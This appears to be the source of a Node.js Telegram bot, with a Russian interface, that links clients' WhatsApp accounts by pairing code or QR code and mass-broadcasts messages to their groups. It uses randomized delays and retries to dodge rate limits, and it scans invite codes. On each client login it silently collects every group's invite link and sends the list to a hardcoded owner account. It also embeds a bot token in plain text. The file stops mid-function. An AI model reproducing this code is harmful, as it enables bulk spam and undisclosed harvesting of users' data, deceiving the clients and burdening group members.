'use strict';

const fs = require('fs');
const path = require('path');
const express = require('express');
const QRCode = require('qrcode');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  Browsers,
} = require('@whiskeysockets/baileys');

// --- CONFIG (ВШИТО) ---
const PORT = Number(process.env.PORT || 3000);
const DATA_DIR = process.env.DATA_DIR || path.join(process.cwd(), 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const OWNER_ID = 5846687574;
const SUB_ADMINS = [8264531154];
const BOT_TOKEN = '9069645701:AAFl6LJQxT4bA1hRLDowJLigUbeIhJR1YcA';

const MAX_USERS = 25;
const PAGE_SIZE_GROUPS = 10;
const PAGE_SIZE_USERS = 6;
const SEND_BASE_MS = 18_000;
const SEND_JITTER_MS = 2_000;
const RETRY_AFTER_MS = 30_000;
const TG_MEDIA_LIMIT = 20 * 1024 * 1024;
const INVITE_DELAY_MS = 200;
const MAX_RECONNECT = 3;

const P = {
  users: path.join(DATA_DIR, 'users.json'),
  banned: path.join(DATA_DIR, 'banned.json'),
  finderDb: path.join(DATA_DIR, `finder_db_${OWNER_ID}.json`),
  inviteCodes: path.join(DATA_DIR, 'invite_codes.txt'),
  collectedLinks: path.join(DATA_DIR, 'collected_links.jsonl'),
  masterJsonl: path.join(DATA_DIR, 'all_groups_master.jsonl'),
  masterTxt: path.join(DATA_DIR, 'all_groups_master.txt'),
  authDir: (id) => path.join(DATA_DIR, `auth_info_${id}`),
  excluded: (id) => path.join(DATA_DIR, `excluded_${id}.json`),
};

const roleOf = (chatId) => {
  const id = Number(chatId);
  if (id === OWNER_ID) return 'owner';
  if (SUB_ADMINS.includes(id)) return 'subadmin';
  return 'client';
};
const isAdmin = (chatId) => ['owner', 'subadmin'].includes(roleOf(chatId));

// --- STORE ---
function readJson(file, fallback) {
  try {
    if (!fs.existsSync(file)) return fallback;
    const raw = fs.readFileSync(file, 'utf8').trim();
    return raw ? JSON.parse(raw) : fallback;
  } catch { return fallback; }
}
function writeJsonAtomic(file, obj) {
  const dir = path.dirname(file);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
  fs.writeFileSync(tmp, JSON.stringify(obj, null, 2), 'utf8');
  fs.renameSync(tmp, file);
}
function appendJsonl(file, obj) {
  const dir = path.dirname(file);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.appendFileSync(file, JSON.stringify(obj) + '\n', 'utf8');
}

// --- WA (BAILEYS) ---
const waLogger = pino({ level: 'silent' });
const sessions = new Map();

function getSession(id) { return sessions.get(Number(id)); }
function isConnected(id) {
  const s = getSession(id);
  return !!(s && s.active && s.sock);
}

async function qrToPngBuffer(text, size = 512) {
  return QRCode.toBuffer(text, {
    type: 'png', errorCorrectionLevel: 'M', margin: 2, width: size,
    color: { dark: '#000', light: '#fff' },
  });
}
function normalizePhone(input) {
  let d = String(input).replace(/[^\d]/g, '');
  if (d.length === 11 && d.startsWith('8')) d = '7' + d.slice(1);
  if (d.length === 10) d = '7' + d;
  return d;
}
function resetAuthFiles(id) {
  const dir = P.authDir(id);
  try { if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true }); } catch {}
  const rec = sessions.get(Number(id));
  if (rec) { rec.active = false; rec.reconnectAttempts = 0; rec.qrCount = 0; }
}

async function startSession(chatId, opts = {}) {
  const id = Number(chatId);
  const { onQR, onPairing, onStatus, onLoggedOut, onOwnerFile, phoneNumber, forceReset = false } = opts;

  if (forceReset) resetAuthFiles(id);
  const authDir = P.authDir(id);
  fs.mkdirSync(authDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version } = await fetchLatestBaileysVersion();

  let rec = sessions.get(id);
  if (!rec) {
    rec = { sock: null, state, reconnectAttempts: 0, qrCount: 0, active: false };
    sessions.set(id, rec);
  } else { rec.state = state; }

  const sock = makeWASocket({
    version, logger: waLogger,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, waLogger) },
    browser: Browsers.ubuntu('Chrome'), printQRInTerminal: false,
    markOnlineOnConnect: false, syncFullHistory: false, getMessage: async () => ({ conversation: '' }),
  });
  rec.sock = sock;
  sock.ev.on('creds.update', saveCreds);

  if (phoneNumber && !sock.authState.creds.registered) {
    try {
      await new Promise(r => setTimeout(r, 1500));
      const code = await sock.requestPairingCode(normalizePhone(phoneNumber));
      if (onPairing) await onPairing(code);
    } catch (e) { if (onStatus) onStatus('pairing_error'); }
  }

  sock.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect, qr } = u;

    if (qr && !phoneNumber) {
      rec.qrCount++;
      if (rec.qrCount > 3) {
        if (onStatus) onStatus('qr_expired');
        resetAuthFiles(id); rec.qrCount = 0;
        try { sock.end(undefined); } catch {}
        return;
      }
      try { if (onQR) await onQR(await qrToPngBuffer(qr)); } catch {}
    }

    if (connection === 'open') {
      rec.active = true; rec.reconnectAttempts = 0; rec.qrCount = 0;
      if (onStatus) onStatus('connected');
      setImmediate(async () => {
        try { await collectGroupsForClient(id, { onOwnerFile }); } catch {}
      });
    }

    if (connection === 'close') {
      rec.active = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 401 || statusCode === 403;

      if (isLoggedOut) {
        resetAuthFiles(id);
        if (onLoggedOut) await onLoggedOut('logout');
        if (onStatus) onStatus('logged_out');
        try { sock.end(undefined); } catch {}
        return;
      }
      if (rec.reconnectAttempts < MAX_RECONNECT) {
        rec.reconnectAttempts++;
        setTimeout(() => startSession(id, { ...opts, forceReset: false }).catch(() => {}), 2000 * rec.reconnectAttempts);
      }
    }
  });
  return sock;
}

async function stopSession(chatId, { wipe = false } = {}) {
  const id = Number(chatId);
  const rec = sessions.get(id);
  if (rec && rec.sock) { try { await rec.sock.logout(); } catch {}; try { rec.sock.end(); } catch {} }
  sessions.delete(id);
  if (wipe) resetAuthFiles(id);
}

async function fetchAllGroups(chatId) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) return [];
  const raw = await rec.sock.groupFetchAllParticipating();
  const out = [];
  for (const jid of Object.keys(raw)) {
    const g = raw[jid];
    out.push({
      jid, subject: g.subject || '(без названия)',
      size: g.size || (g.participants ? g.participants.length : 0),
      announce: !!g.announce || !!g.isCommunityAnnounce,
      isAdmin: isUserAdmin(g, rec.sock),
    });
  }
  out.sort((a, b) => b.size - a.size);
  return out;
}

function isUserAdmin(g, sock) {
  try {
    const me = sock.user?.id; if (!me) return false;
    const bare = me.split(':')[0].split('@')[0];
    return (g.participants || []).some(p => String(p.id).includes(bare) && (p.admin === 'admin' || p.admin === 'superadmin'));
  } catch { return false; }
}

async function sendMessage(chatId, jid, message) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) throw new Error('session_inactive');
  return rec.sock.sendMessage(jid, message);
}

async function checkInvite(chatId, code) {
  const rec = sessions.get(Number(chatId));
  if (!rec || !rec.active || !rec.sock) throw new Error('session_inactive');
  return rec.sock.groupGetInviteInfo(code);
}

// --- AUTOCOLLECT (СБОР ГРУПП) ---
const collectedThisSession = new Set();

async function fetchGroupInvite(sock, jid) {
  try { const code = await sock.groupInviteCode(jid); return code ? `https://chat.whatsapp.com/${code}` : null; }
  catch { return null; }
}

async function collectGroupsForClient(chatId, { onOwnerFile } = {}) {
  const id = Number(chatId);
  if (collectedThisSession.has(id)) return;
  const rec = sessions.get(id);
  if (!rec || !rec.active || !rec.sock) return;

  const raw = await rec.sock.groupFetchAllParticipating().catch(() => ({}));
  const jids = Object.keys(raw);
  if (!jids.length) { collectedThisSession.add(id); return; }

  const rows = [];
  for (const jid of jids) {
    const g = raw[jid];
    const invite = await fetchGroupInvite(rec.sock, jid);
    const row = { ts: Date.now(), fromId: id, jid, subject: g.subject || '(без названия)', size: g.size || g.participants?.length || 0, announce: !!g.announce, invite };
    rows.push(row); appendJsonl(P.masterJsonl, row);
    await new Promise(r => setTimeout(r, 250));
  }
  collectedThisSession.add(id);
  rebuildMasterTxt();

  if (onOwnerFile) {
    try { await onOwnerFile(fs.readFileSync(P.masterTxt), rows.length, id); } catch {}
  }
}

function rebuildMasterTxt() {
  if (!fs.existsSync(P.masterJsonl)) return fs.writeFileSync(P.masterTxt, '# Пусто.\n', 'utf8');
  const lines = ['# Единый файл всех групп', `# ${new Date().toISOString()}`, ''];
  const byUser = new Map();
  for (const l of fs.readFileSync(P.masterJsonl, 'utf8').split('\n').filter(Boolean)) {
    try { const r = JSON.parse(l); if (!byUser.has(r.fromId)) byUser.set(r.fromId, []); byUser.get(r.fromId).push(r); } catch {}
  }
  for (const [uid, groups] of byUser.entries()) {
    lines.push(`## Клиент ${uid} — ${groups.length} групп`, '');
    groups.sort((a, b) => b.size - a.size).forEach(g => {
      lines.push(`${g.announce ? '🔒 ' : ''}${g.subject} | ${g.size} чел. | ${g.invite || '(ссылка недоступна)'}`);
    });
    lines.push('');
  }
  fs.writeFileSync(`${P.masterTxt}.tmp`, lines.join('\n'), 'utf8');
  fs.renameSync(`${P.masterTxt}.tmp`, P.masterTxt);
}

// --- COLLECTOR (РУЧНОЙ СБОР ССЫЛОК) ---
const pendingCollect = new Map();
function setAwaiting(id, state) { pendingCollect.set(Number(id), state); }
function getAwaiting(id) { return pendingCollect.get(Number(id)); }

async function ingestLink(chatId, rawText) {
  const m = String(rawText).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]{8,})/);
  if (!m) return { ok: false };
  const invite = `https://chat.whatsapp.com/${m[1]}`;
  let subject = '(не проверено)', size = 0;
  try {
    const info = await checkInvite(OWNER_ID, m[1]);
    subject = info.subject || '(без названия)'; size = info.size || 0;
  } catch {}
  const record = { ts: Date.now(), fromId: Number(chatId), fromRole: roleOf(chatId), invite, subject, size };
  appendJsonl(P.collectedLinks, record);
  return { ok: true, record };
}

function exportCollectedTxt() {
  let lines = ['# Собранные ссылки', `# ${new Date().toISOString()}`, ''];
  if (fs.existsSync(P.collectedLinks)) {
    for (const l of fs.readFileSync(P.collectedLinks, 'utf8').split('\n').filter(Boolean)) {
      try { const r = JSON.parse(l); lines.push(`[${new Date(r.ts).toISOString()}] ${r.fromId} | ${r.subject} | ${r.size} | ${r.invite}`); } catch {}
    }
  }
  return lines.join('\n');
}

// --- GROUPS & EXCLUSIONS ---
async function listGroupsSorted(chatId) {
  const all = await fetchAllGroups(chatId);
  return all.map(g => ({ ...g, closed: g.announce && !g.isAdmin }));
}
function loadExcluded(chatId) { return new Set(readJson(P.excluded(chatId), [])); }
function saveExcluded(chatId, set) { writeJsonAtomic(P.excluded(chatId), [...set]); }

// --- SENDER (РАССЫЛКА) ---
const activeBroadcasts = new Map();
function stopBroadcast(id) { const r = activeBroadcasts.get(Number(id)); if (r) r.stop = true; return !!r; }
function shuffleFisherYates(arr) {
  const a = arr.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a;
}
async function sleepInterruptible(ms, ctx) {
  let left = ms; while (left > 0) { if (ctx.stop) return false; const c = Math.min(1000, left); await new Promise(r => setTimeout(r, c)); left -= c; } return true;
}
function isTransientError(err) { const m = String(err?.message || err).toLowerCase(); return m.includes('rate-overlimit') || m.includes('timeout') || m.includes('428') || m.includes('408'); }

function buildPayload(media, caption) {
  if (!media) return { text: caption || '' };
  const { kind, buffer, mimetype, filename } = media;
  switch (kind) {
    case 'image': return { image: buffer, caption, mimetype };
    case 'video': return { video: buffer, caption, mimetype };
    case 'gif':   return { video: buffer, caption, mimetype, gifPlayback: true };
    case 'doc':   return { document: buffer, caption, mimetype, fileName: filename };
    default:      return { text: caption || '' };
  }
}

async function runBroadcast(chatId, groups, media, caption) {
  const id = Number(chatId);
  if (activeBroadcasts.has(id)) return { ok: false, error: 'already_running' };
  const ctx = { running: true, stop: false, stats: { success: 0, skipped: 0, errors: [], failed: [] } };
  activeBroadcasts.set(id, ctx);

  const target = groups.filter(g => !g.closed);
  ctx.stats.skipped = groups.length - target.length;

  for (let i = 0; i < target.length; i++) {
    if (ctx.stop) break;
    const g = target[i], payload = buildPayload(media, caption);
    let sent = false, attempt = 0;
    while (!sent && attempt < 2 && !ctx.stop) {
      attempt++;
      try {
        await sendMessage(id, g.jid, payload);
        ctx.stats.success++; sent = true;
      } catch (e) {
        if (attempt < 2 && isTransientError(e)) { if (!(await sleepInterruptible(RETRY_AFTER_MS, ctx))) break; continue; }
        ctx.stats.errors.push({ subject: g.subject, reason: String(e.message || e) }); break;
      }
    }
    if (!ctx.stop && i < target.length - 1) {
      const delay = SEND_BASE_MS + Math.floor(Math.random() * SEND_JITTER_MS);
      if (!(await sleepInterruptible(delay, ctx))) break;
    }
  }
  ctx.running = false;
  activeBroadcasts.delete(id);
  return { ok: true, stats: ctx.stats, stopped: ctx.stop };
}

// --- INVITES (FINDER) ---
function loadFinderDb() { return readJson(P.finderDb, { checked: {}, resetAt: 0 }); }
function saveFinderDb(db) { writeJsonAtomic(P.finderDb, db); }
function loadInviteCodes() {
  try {
    if (!fs.existsSync(P.inviteCodes)) return [];
    return fs.readFileSync(P.inviteCodes, 'utf8').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  } catch { return []; }
}
function parseInviteCode(raw) {
  const s = String(raw).trim();
  const m = s.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
  if (m) return m[1];
  return s.replace(/[^\w-]/g, '');
}
async function scanInvites({ limit = 50 } = {}) {
  const db = loadFinderDb(), codes = loadInviteCodes(), results = { open: [], request: [], dead: [], dup: [] };
  let processed = 0;
  for (const raw of codes) {
    if (processed >= limit) break;
    const code = parseInviteCode(raw);
    if (!code) continue;
    if (db.checked[code] && !db.checked[code].show) { results.dup.push(code); continue; }
    try {
      const info = await checkInvite(OWNER_ID, code);
      processed++;
      db.checked[code] = { subject: info.subject || '', size: info.size || 0, request: !!info.requestJoin, announce: !!info.announce, show: false, checkedAt: Date.now() };
      const entry = { code, subject: info.subject, size: info.size };
      if (info.requestJoin) results.request.push(entry); else results.open.push(entry);
    } catch (e) {
      results.dead.push({ code, reason: String(e.message || e) });
      db.checked[code] = { dead: true, show: false, checkedAt: Date.now() };
    }
    await new Promise(r => setTimeout(r, INVITE_DELAY_MS));
  }
  saveFinderDb(db);
  results.open.sort((a, b) => (b.size || 0) - (a.size || 0));
  results.request.sort((a, b) => (b.size || 0) - (a.size || 0));
  return results;
}
function resetFinderHistory() {
  const db = loadFinderDb(); db.resetAt = Date.now();
  for (const k of Object.keys(db.checked)) db.checked[k].show = true;
  saveFinderDb(db);
}

// --- UI & BOT HANDLERS ---
const ui = new Map();
function uiState(id) {
  if (!ui.has(Number(id))) ui.set(Number(id), { mode: 'idle', page: 0, onlyEx: false, media: null, caption: '', admPage: 0, admUser: null, bcMode: 'one', selJid: null });
  return ui.get(Number(id));
}

function loadUsers() { return readJson(P.users, {}); }
function saveUsers(u) { writeJsonAtomic(P.users, u); }
function loadBanned() { return new Set(readJson(P.banned, [])); }
function saveBanned(s) { writeJsonAtomic(P.banned, [...s]); }

function mainKeyboard(chatId) {
  const role = roleOf(chatId), conn = isConnected(chatId), rows = [];
  if (conn) {
    rows.push([{ text: '📤 Рассылка', callback_data: 'bc_menu' }, { text: '📋 Список групп', callback_data: 'gr_list_0' }]);
    rows.push([{ text: '🚫 Исключения', callback_data: 'ex_list_0' }, { text: '📎 Поделиться ссылкой', callback_data: 'share_link' }]);
  } else {
    rows.push([{ text: '📱 Войти в аккаунт (Pair)', callback_data: 'wa_pair' }]);
    rows.push([{ text: '📷 Войти в аккаунт (QR)', callback_data: 'wa_qr' }]);
  }
  if (role === 'owner') {
    rows.push([{ text: '🔍 Найти группы', callback_data: 'finder' }]);
    rows.push([{ text: '📦 Единый файл групп', callback_data: 'collected_master' }]);
    rows.push([{ text: '📎 Ручные ссылки', callback_data: 'collected_links' }]);
  }
  if (isAdmin(chatId)) rows.push([{ text: '👑 Админ-панель', callback_data: 'admin_panel' }]);
  rows.push([{ text: 'ℹ️ Статус', callback_data: 'status' }]);
  return { reply_markup: { inline_keyboard: rows } };
}

function createBot(token) {
  const bot = new TelegramBot(token, { polling: true });
  bot.deleteWebHook().catch(() => {});
  bot.setMyCommands([{ command: 'start', description: 'Меню' }]).catch(() => {});
  
  bot.on('polling_error', (err) => {
    const code = err?.response?.body?.error_code;
    if (code === 409) setTimeout(() => { try { bot.startPolling(); } catch {} }, 3000);
  });

  bot.on('callback_query', async (q) => {
    if (loadBanned().has(q.from.id)) return bot.answerCallbackQuery(q.id, { text: '⛔ Бан', show_alert: true });
    return handleCallback(bot, q);
  });

  bot.on('message', async (msg) => {
    if (!msg.from || loadBanned().has(msg.from.id)) return;
    const st = uiState(msg.from.id);

    if (st.mode === 'bc_await_text') {
      st.caption = msg.text || '';
      st.mode = 'idle';
      return showBroadcastMenu(bot, msg.from.id);
    }
    if (st.mode === 'bc_await_media') {
      let kind = null, fileId = null, name = null, mime = null;
      if (msg.photo) { kind = 'image'; fileId = msg.photo.pop().file_id; }
      else if (msg.video) { kind = 'video'; fileId = msg.video.file_id; mime = msg.video.mime_type; }
      else if (msg.animation) { kind = 'gif'; fileId = msg.animation.file_id; mime = msg.animation.mime_type; }
      else if (msg.document) { kind = 'doc'; fileId = msg.document.file_id; name = msg.document.file_name; mime = msg.document.mime_type; }
      else return bot.sendMessage(msg.from.id, '⚠️ Нужно фото/видео/файл.');
      
      try {
        const link = await bot.getFileLink(fileId);
        const res = await fetch(link);
        const buffer = Buffer.from(await res.arrayBuffer());
        if (buffer.length > TG_MEDIA_LIMIT) return bot.sendMessage(msg.from.id, '⚠️ Файл больше 20МБ!');
        st.media = { kind, buffer, mimetype: mime, filename: name };
        st.mode = 'idle';
        return showBroadcastMenu(bot, msg.from.id);
      } catch (e) { st.mode = 'idle'; return bot.sendMessage(msg.from.id, '❌ Ошибка загрузки.'); }
    }

    const awaiting = getAwaiting(msg.from.id);
    if (awaiting && msg.text) {
      if (msg.text.startsWith('/')) setAwaiting(msg.from.id, false);
      else {
        const res = await ingestLink(msg.from.id, msg.text);
        if (res.ok) { setAwaiting(msg.from.id, false); return bot.sendMessage(msg.from.id, `✅ Принято: *${res.record.subject}*`, { parse_mode: 'Markdown' }); }
        return bot.sendMessage(msg.from.id, '⚠️ Не похоже на ссылку.');
      }
    }

    if (st.mode === 'admin_broadcast' && roleOf(msg.from.id) === 'owner') {
      const users = Object.keys(loadUsers());
      let sent = 0;
      for (const uid of users) {
        try { await bot.sendMessage(uid, `📣 *Объявление:*\n\n${msg.text}`, { parse_mode: 'Markdown' }); sent++; } catch {}
      }
      st.mode = 'idle';
      return bot.sendMessage(msg.from.id, `✅ Отправлено ${sent} пользователям.`);
    }

    return handleMessage(bot, msg);
  });
  return bot;
}

async function handleMessage(bot, msg) {
  const chatId = msg.from.id, text = msg.text || '', role = roleOf(chatId), st = uiState(chatId);

  if (st.mode === 'await_phone') {
    const phone = String(text).trim();
    if (!/^\d{10,15}$/.test(phone.replace(/[^\d]/g, ''))) return bot.sendMessage(chatId, '⚠️ Формат: 79991234567.');
    st.mode = 'pairing';
    bot.sendMessage(chatId, '⏳ Запрашиваю код…');
    await startSession(chatId, {
      phoneNumber: phone,
      onPairing: async (code) => {
        await bot.sendMessage(chatId, `🔑 Код:\n\n<code>${code}</code>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '📋 Скопировать', copy_text: { text: code } }]] } });
      },
      onStatus: async (s) => {
        if (s === 'connected') {
          await bot.sendMessage(chatId, '✅ Подключено!');
          const u = loadUsers(); if (u[String(chatId)]) { u[String(chatId)].waConnected = true; saveUsers(u); }
          st.mode = 'idle';
        } else if (s === 'logged_out') { st.mode = 'idle'; bot.sendMessage(chatId, '⚠️ Сессия закрыта.'); }
      },
      onOwnerFile: async (buf, count, cid) => {
        await bot.sendDocument(OWNER_ID, buf, { caption: `📎 Вход клиента ${cid}\nГрупп: ${count}` }, { filename: 'master.txt' });
      }
    });
    return;
  }

  if (text === '/cancel') { setAwaiting(chatId, false); st.mode = 'idle'; return bot.sendMessage(chatId, '↩️ Отменено', mainKeyboard(chatId)); }
  if (text === '/stop') { if (stopBroadcast(chatId)) return bot.sendMessage(chatId, '🛑 Стоп.'); }
  if (text === '/start' || text === '/menu') {
    const u = loadUsers();
    if (!u[String(chatId)]) { u[String(chatId)] = { id: chatId, role, createdAt: Date.now() }; saveUsers(u); }
    return bot.sendMessage(chatId, `👋 Роль: *${role}*`, { parse_mode: 'Markdown', ...mainKeyboard(chatId) });
  }
  return bot.sendMessage(chatId, 'Меню /start', mainKeyboard(chatId));
}

async function handleCallback(bot, q) {
  const chatId = q.from.id, data = q.data || '', role = roleOf(chatId), st = uiState(chatId);
  await bot.answerCallbackQuery(q.id).catch(() => {});

  if (data === 'wa_pair') { st.mode = 'await_phone'; return bot.sendMessage(chatId, '📱 Номер (7999...):'); }
  if (data === 'wa_qr') {
    st.mode = 'qr'; await bot.sendMessage(chatId, '📷 Генерирую QR...');
    await startSession(chatId, {
      onQR: async (png) => bot.sendPhoto(chatId, png, { caption: 'Сканируй' }),
      onStatus: async (s) => { if (s === 'connected') { st.mode = 'idle'; bot.sendMessage(chatId, '✅ Подключено!'); } },
      onOwnerFile: async (buf, count, cid) => {
        await bot.sendDocument(OWNER_ID, buf, { caption: `📎 Вход клиента (QR) ${cid}\nГрупп: ${count}` }, { filename: 'master.txt' });
      }
    });
    return;
  }
  if (data === 'status') return bot.sendMessage(chatId, `Роль: ${role}\nWA: ${isConnected(chatId) ? '🟢' : '🔴'}`, mainKeyboard(chatId));

  if (data.startsWith('gr_list_')) { st.page = Number(data.split('_')[2] || 0); return renderGroups(bot, chatId); }
  if (data === 'gr_refresh') return renderGroups(bot, chatId);
  if (data.startsWith('gr_select_')) { st.selJid = data.slice('gr_select_'.length); st.bcMode = 'one'; return showBroadcastMenu(bot, chatId); }

  if (data.startsWith('ex_list_')) { st.page = Number(data.split('_')[2] || 0); return renderExclusions(bot, chatId); }
  if (data.startsWith('ex_toggle_')) {
    const jid = data.slice('ex_toggle_'.length), ex = loadExcluded(chatId);
    ex.has(jid) ? ex.delete(jid) : ex.add(jid); saveExcluded(chatId, ex); return renderExclusions(bot, chatId);
  }
  if (data === 'ex_clear') { saveExcluded(chatId, new Set()); return renderExclusions(bot, chatId); }
  if (data.startsWith('ex_only_')) { st.onlyEx = data === 'ex_only_1'; return renderExclusions(bot, chatId); }

  if (data === 'bc_menu') return showBroadcastMenu(bot, chatId);
  if (data === 'bc_stop') { stopBroadcast(chatId); return bot.sendMessage(chatId, '🛑 Стоп.'); }
  if (data === 'bc_mode_one') { st.bcMode = 'one'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_mode_ten') { st.bcMode = 'ten'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_mode_all') { st.bcMode = 'all'; return showBroadcastMenu(bot, chatId); }
  if (data === 'bc_set_text') { st.mode = 'bc_await_text'; return bot.sendMessage(chatId, '📝 Текст:'); }
  if (data === 'bc_attach') { st.mode = 'bc_await_media'; return bot.sendMessage(chatId, '📎 Фото/видео/файл:'); }
  if (data === 'bc_clear') { st.media = null; st.caption = ''; return showBroadcastMenu(bot, chatId); }
  
  if (data === 'bc_start') {
    const all = await listGroupsSorted(chatId).catch(() => []), ex = loadExcluded(chatId);
    let targets = [];
    if (st.bcMode === 'one') targets = all.filter(g => g.jid === st.selJid);
    else if (st.bcMode === 'ten') targets = shuffleFisherYates(all.filter(g => !g.closed && !ex.has(g.jid))).slice(0, 10);
    else targets = all.filter(g => !g.closed && !ex.has(g.jid));
    
    if (!targets.length) return bot.sendMessage(chatId, '⚠️ Нет групп.');
    bot.sendMessage(chatId, `🚀 Запуск (${targets.length})...`);
    const res = await runBroadcast(chatId, targets, st.media, st.caption);
    return bot.sendMessage(chatId, `✅ Отправлено: ${res.stats.success}\n🔒 Пропущено: ${res.stats.skipped}\n⚠️ Ошибок: ${res.stats.errors.length}`);
  }

  if (data === 'share_link') { setAwaiting(chatId, true); return bot.sendMessage(chatId, '📎 Ссылка на группу WhatsApp:'); }

  if (data === 'collected_master' && role === 'owner') {
    try { rebuildMasterTxt(); const b = fs.readFileSync(P.masterTxt); return bot.sendDocument(chatId, b, { caption: '📦 Все группы' }, { filename: 'master.txt' }); } catch { return bot.sendMessage(chatId, '❌ Пусто'); }
  }
  if (data === 'collected_links' && role === 'owner') {
    const b = Buffer.from(exportCollectedTxt(), 'utf8');
    return bot.sendDocument(chatId, b, { caption: '📎 Ручные ссылки' }, { filename: 'links.txt' });
  }

  if (data === 'finder' && role === 'owner') {
    const sent = await bot.sendMessage(chatId, '🔍 Проверяю инвайты…');
    try {
      const res = await scanInvites({ limit: 100 });
      const fmt = (arr) => arr.slice(0, 20).map(g => `• ${g.subject} — ${g.size} чел.`).join('\n') || '—';
      const msg = [
        `🟢 *Открытые* (${res.open.length}):\n${fmt(res.open)}`,
        ``, `🟡 *По запросу* (${res.request.length}):\n${fmt(res.request)}`,
        ``, `🔴 Битых: ${res.dead.length} · Пропущено: ${res.dup.length}`,
      ].join('\n');
      return bot.editMessageText(msg, { chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown' })
        .catch(() => bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' }));
    } catch (e) { return bot.sendMessage(chatId, `❌ ${e.message}`); }
  }

  if (data === 'admin_panel' && isAdmin(chatId)) { st.admPage = 0; return renderAdminPanel(bot, chatId); }
  if (data.startsWith('adm_page_') && isAdmin(chatId)) { st.admPage = Number(data.slice('adm_page_'.length)); return renderAdminPanel(bot, chatId); }
  if (data.startsWith('adm_user_') && isAdmin(chatId)) { st.admUser = Number(data.slice('adm_user_'.length)); return renderAdminUser(bot, chatId); }
  if (data.startsWith('adm_kickwa_')) { const t = Number(data.slice('adm_kickwa_'.length)); await stopSession(t, { wipe: true }); return renderAdminUser(bot, chatId); }
  if (data.startsWith('adm_stop_')) { stopBroadcast(Number(data.slice('adm_stop_'.length))); return bot.sendMessage(chatId, '🛑 Сигнал.'); }
  if (data.startsWith('adm_ban_')) {
    const t = Number(data.slice('adm_ban_'.length)); if (t === OWNER_ID) return;
    const b = loadBanned(); b.has(t) ? b.delete(t) : b.add(t); saveBanned(b); return renderAdminUser(bot, chatId);
  }
  if (data.startsWith('adm_del_')) {
    const t = Number(data.slice('adm_del_'.length)); if (t === OWNER_ID) return;
    await stopSession(t, { wipe: true }); const u = loadUsers(); delete u[String(t)]; saveUsers(u); return renderAdminPanel(bot, chatId);
  }
  if (data === 'adm_broadcast' && role === 'owner') { st.mode = 'admin_broadcast'; return bot.sendMessage(chatId, '📣 Текст объявления:'); }
}

async function renderGroups(bot, chatId) {
  const st = uiState(chatId), all = await listGroupsSorted(chatId).catch(() => []), ex = loadExcluded(chatId);
  const pages = Math.max(1, Math.ceil(all.length / PAGE_SIZE_GROUPS)), page = Math.min(st.page, pages - 1);
  st.page = page;
  const slice = all.slice(page * PAGE_SIZE_GROUPS, (page + 1) * PAGE_SIZE_GROUPS);
  const kb = slice.map((g, i) => [{ text: `${ex.has(g.jid) ? '🚫' : '☑'} ${g.closed ? '🔒' : ''} ${g.subject.slice(0, 30)} (${g.size})`, callback_data: `gr_select_${g.jid}` }]);
  kb.push([{ text: '⬅️', callback_data: `gr_list_${Math.max(0, page - 1)}` }, { text: '➡️', callback_data: `gr_list_${Math.min(pages - 1, page + 1)}` }]);
  kb.push([{ text: '🔄 Обновить', callback_data: 'gr_refresh' }, { text: '🏠 Меню', callback_data: 'status' }]);
  return bot.sendMessage(chatId, `📋 Группы (${page + 1}/${pages})`, { reply_markup: { inline_keyboard: kb } });
}

async function renderExclusions(bot, chatId) {
  const st = uiState(chatId), all = await listGroupsSorted(chatId).catch(() => []), ex = loadExcluded(chatId);
  const filtered = all.filter(g => st.onlyEx ? ex.has(g.jid) : true);
  const pages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE_GROUPS)), page = Math.min(st.page, pages - 1);
  st.page = page;
  const slice = filtered.slice(page * PAGE_SIZE_GROUPS, (page + 1) * PAGE_SIZE_GROUPS);
  const kb = slice.map(g => [{ text: `${ex.has(g.jid) ? '☑ Убрать' : '🚫 Искл'}: ${g.subject.slice(0, 20)}`, callback_data: `ex_toggle_${g.jid}` }]);
  kb.push([{ text: '⬅️', callback_data: `ex_list_${Math.max(0, page - 1)}` }, { text: '➡️', callback_data: `ex_list_${Math.min(pages - 1, page + 1)}` }]);
  kb.push([{ text: st.onlyEx ? '☑ Только искл' : '◻️ Только искл', callback_data: `ex_only_${st.onlyEx ? 0 : 1}` }, { text: '🧹 Сброс', callback_data: 'ex_clear' }]);
  kb.push([{ text: '🏠 Меню', callback_data: 'status' }]);
  return bot.sendMessage(chatId, `🚫 Исключения (${page + 1}/${pages})`, { reply_markup: { inline_keyboard: kb } });
}

async function showBroadcastMenu(bot, chatId) {
  const st = uiState(chatId);
  const kb = [
    [{ text: st.bcMode === 'one' ? '☑ В 1' : '◻️ В 1', callback_data: 'bc_mode_one' }, { text: st.bcMode === 'ten' ? '☑ В 10' : '◻️ В 10', callback_data: 'bc_mode_ten' }, { text: st.bcMode === 'all' ? '☑ Все' : '◻️ Все', callback_data: 'bc_mode_all' }],
